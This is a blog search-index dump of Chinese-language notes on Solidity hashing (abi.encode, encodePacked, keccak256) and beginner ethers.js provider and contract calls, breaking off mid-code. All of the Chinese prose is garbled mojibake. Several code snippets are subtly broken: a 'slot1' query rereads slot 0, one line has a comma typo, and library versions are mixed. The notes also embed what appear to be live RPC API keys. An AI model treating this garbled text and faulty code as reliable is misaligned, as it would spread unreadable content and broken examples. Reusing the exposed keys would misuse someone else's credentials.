è·å–å‡½æ•°é€‰æ‹©å™¨const getHashByAddress = infe.getSighash(&quot;getHashByAddress&quot;);console.log(`getHashByAddress is =&gt; $&#123;getHashByAddress&#125;`);/** * ethersjs ä¸­çš„ ethers.utils.AbiCoder() &lt;=&gt; ç›¸å½“äº solidityä¸­çš„ abi.encode() * */ const abiCoder = new ethers.utils.AbiCoder();// åˆ›å»ºæ¶ˆæ¯let msg1 = &quot;getHashByAddress&quot;;let msg1Hash = abiCoder.encode( [&#x27;string&#x27;], [msg1])let hash = ethers.utils.keccak256(msg1Hash);console.log(`hash is =&gt; $&#123;hash&#125;`);// åˆ›å»ºæ¶ˆæ¯const msg = &quot;getHashByAddress&quot;;// ç­‰æ•ˆäºSolidityä¸­çš„keccak256(abi.encodePacked())const msgHash1 = ethers.utils.solidityKeccak256( [&#x27;string&#x27;], [msg])console.log(`msgHash: $&#123;msgHash1&#125;`)// msgHashï¼š0x1bf2c0ce4546651a1a2feb457b39d891a6b83931cc2454434f39961345ac378c// å…ˆå¯¹ msg è¿›è¡Œæ‰“åŒ… const msgHash2 = ethers.utils.solidityPack( [&#x27;string&#x27;], [msg])// è¿™ä¸¤æ­¥ç­‰æ•ˆäº `solidityPack()`const hash1 = ethers.utils.keccak256(msgHash2);console.log(`msgHash2: $&#123;msgHash2&#125;`);console.log(`hash1 is: $&#123;hash1&#125;`); solidity åˆçº¦123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract getHash &#123; constructor() &#123; &#125; function getHashByAddress(address _address) external pure returns(bytes32) &#123; bytes32 result = keccak256(abi.encodePacked(_address)); return result; &#125; function getHashByString1(string memory _str) external pure returns(bytes32) &#123; // abi.encodePacked(_str); // bytes32 result = keccak256(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encode(_str)); bytes32 result = keccak256(abi.encode(_str)); return result; &#125; function getHashByString2(string memory _str) external pure returns(bytes32) &#123; // bytes32 str = bytes32(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encodePacked(_str)); bytes32 result = keccak256(abi.encodeWithSignature(_str)); // bytes32 result = keccak256(abi.encode(str)); return result; &#125; function getHashByString3(string memory _str) external pure returns(bytes32) &#123; // bytes32 str = bytes32(abi.encodePacked(_str)); bytes32 result = keccak256(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encode(_str)); // bytes32 result = keccak256(abi.encode(str)); return result; &#125; function getHashByString4(string memory _str) external pure returns(bytes32) &#123; // bytes32 str = bytes32(abi.encodePacked(_str)); bytes32 result = sha256(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encode(_str)); // bytes32 result = keccak256(abi.encode(str)); return result; &#125; function getEncode(string memory _str) external pure returns(bytes memory result) &#123; result = abi.encode(_str); // return ; &#125; function getEncodePacked(string memory _str) external pure returns(bytes memory result) &#123; result = abi.encodePacked(_str); // return ; &#125; &#125; abiæ–‡ä»¶123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140[ &#123; &quot;inputs&quot;: [], &quot;stateMutability&quot;: &quot;nonpayable&quot;, &quot;type&quot;: &quot;constructor&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getEncode&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes&quot;, &quot;name&quot;: &quot;result&quot;, &quot;type&quot;: &quot;bytes&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getEncodePacked&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes&quot;, &quot;name&quot;: &quot;result&quot;, &quot;type&quot;: &quot;bytes&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;address&quot;, &quot;name&quot;: &quot;_address&quot;, &quot;type&quot;: &quot;address&quot; &#125; ], &quot;name&quot;: &quot;getHashByAddress&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString1&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString2&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString3&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString4&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;] remixä¸Šçš„ç»“æœï¼š vscodeçš„ç»“æœï¼š","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"abi.encode","slug":"abi-encode","permalink":"https://biyouqiuqiu.com/tags/abi-encode/"},{"name":"abi.encodePacked","slug":"abi-encodePacked","permalink":"https://biyouqiuqiu.com/tags/abi-encodePacked/"},{"name":"solidityKeccak256","slug":"solidityKeccak256","permalink":"https://biyouqiuqiu.com/tags/solidityKeccak256/"},{"name":"abiCoder.encode","slug":"abiCoder-encode","permalink":"https://biyouqiuqiu.com/tags/abiCoder-encode/"},{"name":"hash","slug":"hash","permalink":"https://biyouqiuqiu.com/tags/hash/"}]},{"title":"ethersjs_self","slug":"Ethersjs/Basic_Knowledge/ethersjs_self","date":"2023-05-12T02:47:10.000Z","updated":"2023-05-12T02:47:10.000Z","comments":true,"path":"2023/05/12/Ethersjs/Basic_Knowledge/ethersjs_self/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/12/Ethersjs/Basic_Knowledge/ethersjs_self/","excerpt":"","text":"ethers.js_day011. ethers.jsçš„å®‰è£… å‚è€ƒæ–‡æ¡£ åœ¨ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ï¼š 1npm install --save ethers å‡ºç°çš„é—®é¢˜: a. æŒ‰ç…§ Bç«™æ•™ç¨‹æ¥çš„è¯ï¼Œéœ€è¦ä¿®æ”¹package.jsä¸­çš„é…ç½®ï¼Œå¦‚ï¼š 123456&#123; &quot;type&quot;: &quot;module&quot;, &quot;dependencies&quot;: &#123; &quot;ethers&quot;: &quot;^5.6.9&quot; &#125;&#125; åœ¨è¿™é‡Œï¼šåŠ å…¥äº† &#39;&#39;type&quot;: &quot;module&quot;ä¹‹åï¼Œrequire()è¿™ç§å¼•åŒ…çš„æ–¹å¼å°±ä¸èƒ½ä½¿ç”¨äº†ï¼Œç½‘ä¸Šæœäº†ä¸€ä¸‹è¯´æ˜¯ ES6æ¨¡å—ï¼ˆæ²¡ç³»ç»Ÿå­¦è¿‡JavaScriptï¼Œä¸æ˜¯å¾ˆæ‡‚ï¼Œåªæ˜¯è®°å½•ä¸€ä¸‹ï¼Œé¿å…ç»§ç»­çŠ¯é”™ï¼‰ï¼Œå¾—éœ€è¦ä½¿ç”¨ importçš„æ–¹å¼å¯¼å…¥ ethersåŒ… 1const &#123; ethers &#125; = require(&quot;ethers&quot;); 1import &#123; ethers &#125; from &quot;ethers&quot;; b. Bç«™è§†é¢‘ä¸­åœ¨vscodeä¸Šå®‰è£…çš„ethersåŒ…çš„å‘½ä»¤ä¸ºï¼š 1npm install ethers@5.6.9 è¿™è¡Œä»£ç ä¼šè®©ä»£ç æ— æ³•è¿è¡Œï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š 2. ç¼–å†™ Hello Vitalik2.1 ç¼–è¯‘å™¨ï¼š åœ¨çº¿ç¼–è¯‘å™¨ â€”â€“ playcode æœ¬åœ°ç¼–è¯‘å™¨ â€”â€“ VSCode 2.2 ç¬¬ä¸€æ®µä»£ç  ç¤ºä¾‹ä»£ç ï¼š 1234567import &#123; ethers &#125; from &quot;ethers&quot;;const provider = ethers.getDefaultProvider();const main = async () =&gt; &#123; const balance = await provider.getBalance(`vitalik.eth`); console.log(`ETH Balance of vitalik: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;main() è§£è¯»ä»£ç  1234const main = async () =&gt; &#123; const balance = await provider.getBalance(`vitalik.eth`); console.log(`ETH Balance of vitalik: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125; ä»£ç çš„æ„æ€ï¼š è¿™æ˜¯ä¸€æ®µä½¿ç”¨ JavaScript ç¼–å†™çš„ä»£ç ï¼Œä½¿ç”¨äº† ethers.js åº“ä¸ä»¥å¤ªåŠèŠ‚ç‚¹è¿›è¡Œäº¤äº’ã€‚ è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ªå¼‚æ­¥å‡½æ•° main()ï¼Œåœ¨å‡½æ•°ä¸­ï¼š ä½¿ç”¨ provider.getBalance() å‡½æ•°è·å– vitalik.eth åœ°å€ä¸Šçš„ä»¥å¤ªå¸ä½™é¢ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ balance å˜é‡ä¸­ã€‚è¿™é‡Œçš„ provider æ˜¯ä¸€ä¸ª ethers.js åº“ä¸­æä¾›çš„ä»¥å¤ªåŠèŠ‚ç‚¹å¯¹è±¡ï¼Œå®ƒç”¨äºä¸ä»¥å¤ªåŠç½‘ç»œè¿›è¡Œé€šä¿¡ã€‚ ä½¿ç”¨ ethers.utils.formatEther() å‡½æ•°å°†ä»¥å¤ªå¸ä½™é¢ä» wei å•ä½è½¬æ¢ä¸ºä»¥å¤ªå¸å•ä½ï¼Œå¹¶å°†ç»“æœæ‰“å°åˆ°æ§åˆ¶å°ä¸­ã€‚ å› ä¸º getBalance() å‡½æ•°æ˜¯å¼‚æ­¥å‡½æ•°ï¼Œå®ƒä¼šä»ä»¥å¤ªåŠç½‘ç»œä¸­è¯»å–æ•°æ®ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ await å…³é”®å­—ç­‰å¾…å®ƒå®Œæˆè¯»å–æ“ä½œã€‚åœ¨ç­‰å¾… getBalance() å‡½æ•°å®Œæˆåï¼Œbalance å˜é‡å°†åŒ…å«è¿”å›çš„ä½™é¢å€¼ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œå¤„ç†å¹¶æ‰“å°åˆ°æ§åˆ¶å°ä¸­ã€‚ ethers.js_day023. Provider æä¾›å™¨3.1 è¿è¡Œå¦‚ä¸‹ä»£ç æŠ¥é”™ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// å¯¼å…¥ethersåŒ…import &#123; ethers &#125; from &quot;ethers&quot;;// playcodeå…è´¹ç‰ˆä¸èƒ½å®‰è£…ethersï¼Œç”¨è¿™æ¡å‘½ä»¤ï¼Œéœ€è¦ä»ç½‘ç»œä¸ŠimportåŒ…ï¼ˆæŠŠä¸Šé¢è¿™è¡Œæ³¨é‡Šæ‰ï¼‰// import &#123; ethers &#125; from &quot;https://cdn-cors.ethers.io/lib/ethers-5.6.9.esm.min.js&quot;;// åˆ©ç”¨Alchemyçš„rpcèŠ‚ç‚¹è¿æ¥ä»¥å¤ªåŠç½‘ç»œ// å‡†å¤‡ alchemy API å¯ä»¥å‚è€ƒhttps://github.com/AmazingAng/WTFSolidity/blob/main/Topics/Tools/TOOL04_Alchemy/readme.md const ALCHEMY_MAINNET_URL = &#x27;https://eth-mainnet.g.alchemy.com/v2/oKmOQKbneVkxgHZfibs-iFhIlIAl6HDN&#x27;;const ALCHEMY_GOERLI_URL = &#x27;https://eth-goerli.alchemyapi.io/v2/GlaeWuylnNM3uuOo-SAwJxuwTdqHaY5l&#x27;;// è¿æ¥ä»¥å¤ªåŠä¸»ç½‘const providerETH = new ethers.JsonRpcProvider(ALCHEMY_MAINNET_URL)// è¿æ¥Goerliæµ‹è¯•ç½‘const providerGoerli = new ethers.JsonRpcProvider(ALCHEMY_GOERLI_URL)const main = async () =&gt; &#123; // åˆ©ç”¨providerè¯»å–é“¾ä¸Šä¿¡æ¯ // 1. æŸ¥è¯¢vitalikåœ¨ä¸»ç½‘å’ŒGoerliæµ‹è¯•ç½‘çš„ETHä½™é¢ console.log(&quot;1. æŸ¥è¯¢vitalikåœ¨ä¸»ç½‘å’ŒGoerliæµ‹è¯•ç½‘çš„ETHä½™é¢&quot;); const balance = await providerETH.getBalance(`vitalik.eth`); const balanceGoerli = await providerGoerli.getBalance(`vitalik.eth`); // å°†ä½™é¢è¾“å‡ºåœ¨consoleï¼ˆä¸»ç½‘ï¼‰ console.log(`ETH Balance of vitalik: $&#123;ethers.formatEther(balance)&#125; ETH`); // è¾“å‡ºGoerliæµ‹è¯•ç½‘ETHä½™é¢ console.log(`Goerli ETH Balance of vitalik: $&#123;ethers.formatEther(balanceGoerli)&#125; ETH`); // 2. æŸ¥è¯¢providerè¿æ¥åˆ°äº†å“ªæ¡é“¾ console.log(&quot;\\n2. æŸ¥è¯¢providerè¿æ¥åˆ°äº†å“ªæ¡é“¾&quot;) const network = await providerETH.getNetwork(); console.log(network.toJSON()); // 3. æŸ¥è¯¢åŒºå—é«˜åº¦ console.log(&quot;\\n3. æŸ¥è¯¢åŒºå—é«˜åº¦&quot;) const blockNumber = await providerETH.getBlockNumber(); console.log(blockNumber); // 4. æŸ¥è¯¢ vitalik é’±åŒ…å†å²äº¤æ˜“æ¬¡æ•° console.log(&quot;\\n4. æŸ¥è¯¢ vitalik é’±åŒ…å†å²äº¤æ˜“æ¬¡æ•°&quot;) const txCount = await providerETH.getTransactionCount(&quot;vitalik.eth&quot;); console.log(txCount); // 5. æŸ¥è¯¢å½“å‰å»ºè®®çš„gasè®¾ç½® console.log(&quot;\\n5. æŸ¥è¯¢å½“å‰å»ºè®®çš„gasè®¾ç½®&quot;) const feeData = await providerETH.getFeeData(); console.log(feeData); // 6. æŸ¥è¯¢åŒºå—ä¿¡æ¯ console.log(&quot;\\n6. æŸ¥è¯¢åŒºå—ä¿¡æ¯&quot;) const block = await providerETH.getBlock(0); console.log(block); // 7. ç»™å®šåˆçº¦åœ°å€æŸ¥è¯¢åˆçº¦bytecodeï¼Œä¾‹å­ç”¨çš„WETHåœ°å€ console.log(&quot;\\n7. ç»™å®šåˆçº¦åœ°å€æŸ¥è¯¢åˆçº¦bytecodeï¼Œä¾‹å­ç”¨çš„WETHåœ°å€&quot;) const code = await providerETH.getCode(&quot;0xc778417e063141139fce010982780140aa0cd5ab&quot;); console.log(code);&#125;main() æŠ¥é”™ç»“æœå¦‚ä¸‹ï¼š æŠ¥é”™åŸå› æ˜¯è¯´ JsonRpcProvider ä¸æ˜¯ä¸€ä¸ªæ„é€ å™¨ï¼Œåˆ°å®˜æ–¹æ–‡æ¡£ä¸ŠæŸ¥çœ‹ï¼ŒJsonRpcProviderçš„ç”¨æ³•æ˜¯ï¼š 1234// è¿æ¥ä»¥å¤ªåŠä¸»ç½‘const providerETH = new ethers.providers.JsonRpcProvider(ALCHEMY_MAINNET_URL)// è¿æ¥Goerliæµ‹è¯•ç½‘const providerGoerli = new ethers.providers.JsonRpcProvider(ALCHEMY_GOERLI_URL) RPCçš„è¿æ¥ 3.2 ä¸æœ¬åœ°çš„ganacheè·å–è¿æ¥ ä»£ç ï¼š 123456789import &#123; ethers &#125; from &quot;ethers&quot;;const provider = ethers.getDefaultProvider(&quot;HTTP://127.0.0.1:8545&quot;);// æˆ‘è®¾ç½®çš„ç«¯å£å·ä¸º8545const address = &#x27;&#x27;; // æ›¿æ¢ä¸ºéœ€è¦æŸ¥è¯¢ä½™é¢çš„è´¦æˆ·åœ°å€provider.getBalance(address).then((balance) =&gt; &#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;).catch((err) =&gt; &#123; console.error(&#x27;Error:&#x27;, err);&#125;); â€‹ 3.3 ä¸ metamaskï¼ˆå°ç‹ç‹¸ğŸ¦Šé’±åŒ…ï¼‰å»ºç«‹è¿æ¥ 3.3.1 éœ€è¦åˆ° Alchemy ä¸Šè·å–RPC çš„èŠ‚ç‚¹ 12345678const provider = ethers.getDefaultProvider(&quot;&quot;); // ä»Alchemyè·å–const address = &#x27;&#x27;; // æ›¿æ¢ä¸ºéœ€è¦æŸ¥è¯¢ä½™é¢çš„è´¦æˆ·åœ°å€provider.getBalance(address).then((balance) =&gt; &#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;).catch((err) =&gt; &#123; console.error(&#x27;Error:&#x27;, err);&#125;); 3.4 åˆ©ç”¨Providerè¯»å–é“¾ä¸Šæ•°æ®tipsï¼šconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;); è¿™ä¸ªçš„è¿æ¥é€Ÿåº¦è¦æ¯”const provider = ethers.getDefaultProvider(&quot;HTTP://127.0.0.1:8545&quot;);çš„è¿æ¥é€Ÿåº¦æ›´å¿« 3.5 è·å–æŒ‡å®šåœ°å€çš„ä½™é¢ â€“ provider.getBalance(address) ä»£ç ï¼š 12345&gt;provider.getBalance(address).then((balance) =&gt; &#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&gt;&#125;).catch((err) =&gt; &#123; console.error(&#x27;Error:&#x27;, err);&gt;&#125;); è§£é‡Šï¼š è¿™æ®µä»£ç æ˜¯ä½¿ç”¨ä»¥å¤ªåŠ JavaScript åº“ Ethers.js æ¥æŸ¥è¯¢æŒ‡å®šä»¥å¤ªåŠåœ°å€çš„ä½™é¢ï¼Œå¹¶å°†å…¶ä»¥ä»¥å¤ªå¸ï¼ˆETHï¼‰çš„å½¢å¼æ‰“å°åˆ°æ§åˆ¶å°ä¸Šã€‚ å…·ä½“æ¥è¯´ï¼Œè¿™æ®µä»£ç æ‰§è¡Œäº†ä»¥ä¸‹æ­¥éª¤ï¼š è°ƒç”¨ provider.getBalance(address) æ–¹æ³•ï¼Œå…¶ä¸­ provider æ˜¯ä¸€ä¸ªä»¥å¤ªåŠèŠ‚ç‚¹æä¾›å•†ï¼Œaddress æ˜¯è¦æŸ¥è¯¢çš„ä»¥å¤ªåŠåœ°å€ã€‚ getBalance() æ–¹æ³•è¿”å›ä¸€ä¸ª Promiseï¼Œè¯¥ Promise åœ¨æŸ¥è¯¢å®Œæˆåè¿”å›ä»¥å¤ªåŠåœ°å€çš„ä½™é¢ã€‚ å½“ Promise è¢«è§£ææ—¶ï¼Œthen() æ–¹æ³•ä¸­çš„å›è°ƒå‡½æ•°ä¼šè¢«æ‰§è¡Œã€‚è¯¥å›è°ƒå‡½æ•°ä½¿ç”¨ ethers.utils.formatEther() æ–¹æ³•å°†ä½™é¢ä» wei è½¬æ¢ä¸ºä»¥å¤ªï¼Œå¹¶å°†ç»“æœæ‰“å°åˆ°æ§åˆ¶å°ä¸Šã€‚ å¦‚æœ Promise è¢«æ‹’ç»ï¼ˆå³æŸ¥è¯¢å¤±è´¥ï¼‰ï¼Œåˆ™ catch() æ–¹æ³•ä¸­çš„å›è°ƒå‡½æ•°ä¼šè¢«æ‰§è¡Œï¼Œè¯¥å›è°ƒå‡½æ•°å°†é”™è¯¯ä¿¡æ¯æ‰“å°åˆ°æ§åˆ¶å°ä¸Š 3.6 æŸ¥è¯¢providerè¿æ¥åˆ°é‚£æ¡é“¾ â€“ provider.getNetwork() ä»£ç ï¼š 1const netWork = await provider.getNetwork(); æŸ¥è¯¢ç»“æœï¼š 3.7 æŸ¥è¯¢å½“å‰ gas price â€” provider.getGasPrice() tips:è¿”å›çš„æ•°æ®æ ¼å¼ä¸ºBigNumberï¼Œå¯ä»¥ç”¨BigNumberç±»çš„toNumber()æˆ–toString() æ–¹æ³•è½¬æ¢æˆæ•°å­—æˆ–è€…å­—ç¬¦ä¸² ä»£ç ï¼š 12&gt;const gas_price = await provider.getGasPrice();&gt;console.log(gas_price.toString()); è¿è¡Œç»“æœï¼š 3.8 æŸ¥è¯¢åŒºå—ä¿¡æ¯ â€“ provider.getBlock() ä»£ç ï¼š 1const block = await provider.getBlock(2); æŸ¥è¯¢ç»“æœï¼š 3.9 æŸ¥è¯¢åœ°å€çš„åˆçº¦bytecode â€” provider.getCode(address) ä»£ç ï¼š 12const address = &quot;0x44f2A5d2CFf45111E5FdcBE600CfA62Ea0386E7f&quot;; //åˆçº¦åœ°å€const code = await providerETH.getCode(address); æŸ¥è¯¢ç»“æœï¼š 4.è¯»å–åˆçº¦ä¿¡æ¯4.1 åˆ›å»ºContractå˜é‡4.1.1 åªè¯»Contract tipsï¼šå‚æ•°åˆ†åˆ«æ˜¯åˆçº¦åœ°å€ï¼Œåˆçº¦çš„abiå’Œproviderå˜é‡ï¼ˆåªè¯»ï¼‰ ä»£ç ï¼š 1const contract = new ethers.Contract(`address`,`abi`,`provider`) 4.1.2 å¯è¯»å†™ Contract tips: å‚æ•°åˆ†åˆ«æ˜¯åˆçº¦åœ°å€ï¼Œåˆçº¦çš„abiå’Œsingerå˜é‡ã€‚Singerç­¾åè€…æ˜¯ethersä¸­å¦ä¸€ä¸ªç±»ï¼Œç”¨äºç­¾åäº¤æ˜“ã€‚ ä»£ç ï¼š 1const contract = new ethers.Contract(`address`, `abi`, `signer`); 4.2 åˆ›å»ºåªè¯» Contractå®ä¾‹tipsï¼šåˆ›å»ºContractå®ä¾‹éœ€è¦å¡«å…¥ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯åˆçº¦åœ°å€ï¼Œåˆçº¦abiå’Œproviderå˜é‡ã€‚ tips:ehtersæ”¯æŒä¸¤ç§abiå¡«æ³• æ–¹æ³•ä¸€ï¼šç›´æ¥è¾“å‡ºåˆçº¦çš„abiã€‚ä¹Ÿå¯ä»¥åƒä¹‹å‰web3ä¸­é‚£æ ·ä½¿ç”¨ fsåŒ…è¯»å– .abiæ–‡ä»¶ï¼Œæˆ‘è§‰å¾—è¿™ç§å¯è¯»æ€§æ›´å¼ºä¸€äº›ã€‚ 1234var fs = require(&quot;fs&quot;);var path = &quot;&quot;;//è¿™é‡Œæ˜¯ä½ æœ¬åœ°abiçš„æ–‡ä»¶åœ°å€var contractABI = JSON.parse(fs.readFileSync(path),toString()); å‚è€ƒä»£ç ï¼š 123456789101112131415// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract CallMeChallenge &#123; int public value = 5; bool public isComplete = false; function callme() public &#123; isComplete = true; &#125; function getValue() external view returns(int) &#123; return value; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334import &#123; Contract, ethers &#125; from &quot;ethers&quot;; // ES6æ¨¡å—ä¸‹å¼•å…¥ethersåŒ…// var fs = require(&quot;fs&quot;)import fs from &quot;fs&quot;; // ES6æ¨¡å—ä¸‹å¼•å…¥fsåŒ…const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// è¯»å–æ–‡ä»¶çš„abilet con_ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\ethersjsWorkspace\\\\LearningSelf\\\\abi\\\\CallMeChallenge.abi&quot;).toString())// åˆçº¦åœ°å€let con_Address = &quot;0xCfD32B1C6C1b2Fb425F3d6a86F8E2ebB363b5d96&quot;;// åˆ›å»ºåˆçº¦let contract = new ethers.Contract(con_Address,con_ABI,provider);async function main() &#123; let slot0 = await provider.getStorageAt(con_Address,0); console.log(&quot;slot0 = &gt;&quot; + slot0); let slot1 = await provider.getStorageAt(con_Address,0); console.log(&quot;slot1 = &gt;&quot; + slot1);&#125; // è°ƒç”¨å‡½æ•°main()// è°ƒç”¨åˆçº¦çš„åªè¯»å‡½æ•°let value = await contract.getValue();console.log(&quot;value =&gt; &quot; + value);let address = &quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;;provider.getBalance(address).then((balance)=&gt;&#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;) è¿è¡Œç»“æœï¼š æ³¨: åœ¨Solidityä¸­ï¼Œå¸ƒå°”ç±»å‹(bool)çš„é»˜è®¤å€¼æ˜¯falseã€‚åœ¨ä½ çš„æ™ºèƒ½åˆçº¦ä¸­ï¼Œå­˜å‚¨æ§½(slot)çš„ä½ç½®ä¸º0ï¼Œå­˜å‚¨çš„å˜é‡æ˜¯å¸ƒå°”ç±»å‹(isComplete)ï¼Œå› æ­¤é»˜è®¤å€¼ä¸ºfalseã€‚ å½“ä½ éƒ¨ç½²åˆçº¦æ—¶ï¼Œå­˜å‚¨æ§½çš„åˆå§‹å€¼ä¼šè¢«è®¾ç½®ä¸ºfalseã€‚å¦‚æœåœ¨ä¹‹ååˆçº¦çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œè°ƒç”¨äº†callme()å‡½æ•°ï¼ŒisCompleteå˜é‡çš„å€¼ä¼šè¢«è®¾ç½®ä¸ºtrueï¼Œå­˜å‚¨æ§½çš„å€¼ä¹Ÿä¼šç›¸åº”åœ°è¢«æ›´æ–°ä¸ºtrueã€‚ åœ¨ä½¿ç”¨ethersæŸ¥è¯¢å­˜å‚¨æ§½çš„å€¼æ—¶ï¼Œå¦‚æœå­˜å‚¨æ§½çš„å€¼ä¸ºfalseï¼ŒæŸ¥è¯¢ç»“æœä¼šæ˜¾ç¤ºä¸º0x0ã€‚å¦‚æœå­˜å‚¨æ§½çš„å€¼ä¸ºtrueï¼ŒæŸ¥è¯¢ç»“æœä¼šæ˜¾ç¤ºä¸º0x1ã€‚ å› æ­¤ï¼Œå¦‚æœä½ åœ¨æŸ¥è¯¢æ™ºèƒ½åˆçº¦çš„å­˜å‚¨æ§½æ—¶å¾—åˆ°çš„ç»“æœæ˜¯0x0ï¼Œè¿™æ„å‘³ç€å­˜å‚¨æ§½çš„å€¼ä¸ºfalseï¼Œå³isCompleteå˜é‡è¿˜æ²¡æœ‰è¢«è®¾ç½®ä¸ºtrueã€‚å¦‚æœä½ æƒ³è¦è·å–å­˜å‚¨æ§½çš„å®é™…å€¼ï¼Œå¯ä»¥å°†æŸ¥è¯¢ç»“æœè½¬æ¢ä¸ºå¸ƒå°”ç±»å‹ï¼Œå¦‚ä¸‹æ‰€ç¤º: 123const slot0 = await provider.getStorageAt(contractAddress, 0);const isComplete = ethers.utils.bigNumberify(slot0).toNumber() !== 0;console.log(`isComplete: $&#123;isComplete&#125;`); è¿™æ®µä»£ç å°†æŸ¥è¯¢ç»“æœè½¬æ¢ä¸ºBigNumberç±»å‹ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºæ•°å­—ç±»å‹ã€‚å¦‚æœæ•°å­—ä¸ä¸º0ï¼ŒisCompleteå˜é‡çš„å€¼ä¸ºtrueï¼Œå¦åˆ™ä¸ºfalseã€‚ æ–¹æ³•äºŒï¼šç”±äºabiå¯è¯»æ€§å¤ªå·®ï¼Œethersåˆ›æ–°çš„å¼•å…¥äº†äººç±»å¯è¯»ABIã€‚å¼€å‘è€…å¯ä»¥é€šè¿‡function signatureå’Œevent signatureæ¥å†™ABIã€‚ å‚è€ƒä»£ç ï¼š 123456789101112131415161718192021222324252627import &#123; Contract, ethers &#125; from &quot;ethers&quot;; // ES6æ¨¡å—ä¸‹å¼•å…¥ethersåŒ…// var fs = require(&quot;fs&quot;)import fs from &quot;fs&quot;; // ES6æ¨¡å—ä¸‹å¼•å…¥fsåŒ…const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 